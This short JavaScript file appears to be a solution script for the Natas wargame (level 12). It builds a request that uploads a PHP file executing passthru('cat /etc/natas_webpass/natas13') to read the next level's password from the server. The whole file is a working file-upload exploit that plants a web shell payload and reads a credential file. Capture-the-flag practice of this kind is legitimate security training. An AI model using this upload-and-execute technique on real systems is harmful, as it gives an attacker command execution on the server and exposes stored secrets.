exports.getDynamicOptions = (options,response)=>{
    if(response){
        console.log(response.data)
    }else{
        const fileContent = `<?

        pass: print passthru("cat /etc/natas_webpass/natas13");
        
        ?>`;

        const fileType = 'text/plain';
        const file = new Blob([fileContent], { type: fileType });
        
        options.body.uploadedfile = file;
    }

    return options;
}